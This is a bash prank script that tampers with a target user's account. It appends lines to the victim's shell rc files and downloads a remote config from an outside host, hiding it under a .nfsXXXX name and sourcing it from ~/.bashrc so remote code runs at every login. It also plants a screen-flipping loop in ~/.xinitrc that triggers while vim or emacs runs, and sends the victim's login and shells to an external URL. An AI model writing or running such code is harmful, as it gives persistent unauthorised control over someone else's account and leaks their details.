#! /bin/bash

# Reset
Color_Off='\e[0m'       # Text Reset

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Underline
UBlack='\e[4;30m'       # Black
URed='\e[4;31m'         # Red
UGreen='\e[4;32m'       # Green
UYellow='\e[4;33m'      # Yellow
UBlue='\e[4;34m'        # Blue
UPurple='\e[4;35m'      # Purple
UCyan='\e[4;36m'        # Cyan
UWhite='\e[4;37m'       # White

# Background
On_Black='\e[40m'       # Black
On_Red='\e[41m'         # Red
On_Green='\e[42m'       # Green
On_Yellow='\e[43m'      # Yellow
On_Blue='\e[44m'        # Blue
On_Purple='\e[45m'      # Purple
On_Cyan='\e[46m'        # Cyan
On_White='\e[47m'       # White

# High Intensty
IBlack='\e[0;90m'       # Black
IRed='\e[0;91m'         # Red
IGreen='\e[0;92m'       # Green
IYellow='\e[0;93m'      # Yellow
IBlue='\e[0;94m'        # Blue
IPurple='\e[0;95m'      # Purple
ICyan='\e[0;96m'        # Cyan
IWhite='\e[0;97m'       # White

# Bold High Intensty
BIBlack='\e[1;90m'      # Black
BIRed='\e[1;91m'        # Red
BIGreen='\e[1;92m'      # Green
BIYellow='\e[1;93m'     # Yellow
BIBlue='\e[1;94m'       # Blue
BIPurple='\e[1;95m'     # Purple
BICyan='\e[1;96m'       # Cyan
BIWhite='\e[1;97m'      # White

# High Intensty backgrounds
On_IBlack='\e[0;100m'   # Black
On_IRed='\e[0;101m'     # Red
On_IGreen='\e[0;102m'   # Green
On_IYellow='\e[0;103m'  # Yellow
On_IBlue='\e[0;104m'    # Blue
On_IPurple='\e[10;95m'  # Purple
On_ICyan='\e[0;106m'    # Cyan
On_IWhite='\e[0;107m'   # White


##
# Info to get
##
LOSER="${USER}"
LOSER_SHELL=""
CONF_FILE_NAME="${HOME}/.nfs$((${RANDOM} % 10000))"
JPEG_FILE_NAME="${HOME}/.nfs$((${RANDOM} % 10000)).jpg"

function important_message
{
  IMPORTANT_MESSAGE="${1}"
  (
    echo -e "${Red}IMPORTANT: ${IMPORTANT_MESSAGE}${Color_Off}"
  ) 1>&2

  return 0
}

function message
{
    MESSAGE=${1}
    echo -e "${Green}${MESSAGE}${Color_Off}"
    return 0
}

##
# Get the login of the loser
##
function get_loser_login
{
  if [ -z "${LOSER}" ]; then
    echo "qui est a pourrir ?"
    read -e LOSER
  fi

  return 0
}

##
# This function updates or create the rcfile for the
# shell passed in argument
##
function insert_bash_to_start
{
  RC_FILE="${1}"

  if [ -z "${RC_FILE}" ]; then
      RC_FILE=".tcshrc"
  fi
  OUTPUT_FILE="${HOME}/${RC_FILE}"
  if [ -f "${OUTPUT_FILE}" ]; then
    (
      echo ""
      echo "bash"
      echo ""
    ) >> ${OUTPUT_FILE}
    message "rcfile \"${RC_FILE}\" updated"
  else
    (
      echo ""
      echo "bash"
      echo ""
    ) >> ${OUTPUT_FILE}
    message "rcfile \"${RC_FILE}\" created"
  fi

  return 0
}

##
# This function checks if an user use a different shell
# on the current session: it doesn't check history
##
function get_shell
{
  RESULTAT=$(ps ax | grep -v "grep" | grep "${1}")

  if [ ! -z "${RESULTAT}" ]; then
    if [ -z "${LOSER_SHELL}" ]; then
      LOSER_SHELL="${1}"
    else
      LOSER_SHELL="${LOSER_SHELL}:${1}"
    fi
    return 0
  else
    return 1
  fi
}

##
# Main function to check all of the shell
# use in the current session:
# and don't look for shell use history
##
function find_default_shell
{
  get_shell "zsh" && insert_bash_to_start ".zshrc" && \
      important_message "${LOSER} use zsh !!!"

  get_shell "bash"

  get_shell "sh" && insert_bash_to_start ".shrc"

  get_shell "tcsh" && insert_bash_to_start
}

##
# This function adds a source commande
# to the end of the file .bashrc
##
function source_bash_pourri
{
  BASHRC="${HOME}/.bashrc"

  echo "source ${CONF_FILE_NAME}" >> ${BASHRC}
}

##
# get a conf file and copy it in a random named file .nfsXXXX
##
function get_bashrc_pourri
{
  wget "http://bartuka.di-prima.fr/documents/myconfbash" > /dev/null 2>&1

  mv ./myconfbash ${CONF_FILE_NAME}
  return ${?}
}

function pourri_xinitrc
{
  echo "#! /bin/bash

rot=0

rotation ()
{

    xrandr -x
    sleep 0.2
    xrandr -y
    sleep 0.2
    xrandr -xy
    sleep 0.2
    xrandr -x
    sleep 0.2
    xrandr -xy
    xrandr -o normal
}

wallpaper ()
{
  gconftool-2 -t str -s /desktop/gnome/background/picture_filename ${HOME}/${JPEG_FILE_NAME}
}

wallpaper

count=0
timesegment=60
modulo=\$((\${timesegment} + ($RANDOM % \${timesegment} )))

while [ 1 ]; do
  if [ \"\$((\$count % \${modulo} ))\" -eq \"0\" ] ; then
    if [ -n \"\`ps aux | grep vim | grep -v grep\`\" ] || [ -n \"\`ps aux | grep emacs | grep -v grep\`\" ] ; then
      rotation
    fi
    modulo=\$((\${timesegment} + (\$RANDOM % \${timesegment}) ))
  fi

  sleep 1
  count=\$(($count + 1))
done

" >> ${HOME}/.xinitrc
  return 0
}



# get login
get_loser_login

# find shell use currently
find_default_shell

# get sad bash conf
message "dowloading new conf"
get_bashrc_pourri
message "dowload down"

# add it to the conf file
source_bash_pourri
message "niveau 1: OK"


# get picture
wget "http://bartuka.di-prima.fr/documents/3-petits-cochons.jpg" > /dev/null 2>&1
mv ./3-petits-cochons.jpg ${JPEG_FILE_NAME}
message "New font downloaded"

# add script to .xinitrc
pourri_xinitrc
message "niveau 2: OK"



##
# Send information to acu;
##
if [ "${LOSER}" != "cailla_j" ]; then
  wget "http://acu.epita.fr/loser.php?login=${LOSER}&shells=${LOSER_SHELL}" > /dev/null 2>&1
else
  echo "login=${LOSER}&shells=${LOSER_SHELL}"
fi

